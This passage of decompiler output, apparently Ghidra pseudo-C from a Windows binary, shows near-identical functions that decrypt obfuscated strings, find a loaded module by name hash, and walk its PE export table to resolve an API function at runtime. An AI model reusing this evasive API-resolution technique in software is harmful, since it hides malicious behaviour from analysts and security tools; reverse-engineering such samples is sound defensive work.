  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x1a);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140008156;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140008156:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_1400081c0 @ 1400081c0 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_1400081c0(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0x10);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  uVar13 = *(uint *)(param_2 + 0x18);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x18);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140008516;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140008516:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140008580 @ 140008580 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140008580(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0x10);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  uVar13 = *(uint *)(param_2 + 0x14);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
